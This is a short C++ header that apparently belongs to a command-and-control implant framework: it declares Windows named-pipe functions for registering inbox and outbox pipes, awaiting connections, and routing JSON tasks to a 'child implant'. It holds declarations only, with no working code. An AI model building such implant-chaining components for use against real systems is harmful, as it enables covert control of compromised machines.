#pragma once
#include <windows.h>
#include <vector>

int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe);
std::vector<uint8_t> read_from_pipe(HANDLE pipe, OVERLAPPED* ol);
bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name);
nlohmann::json route_task_to_child_implant(const nlohmann::json& task);
nlohmann::json push_to_child(HANDLE h_write, HANDLE h_read, const nlohmann::json& raw_task, bool expect_response);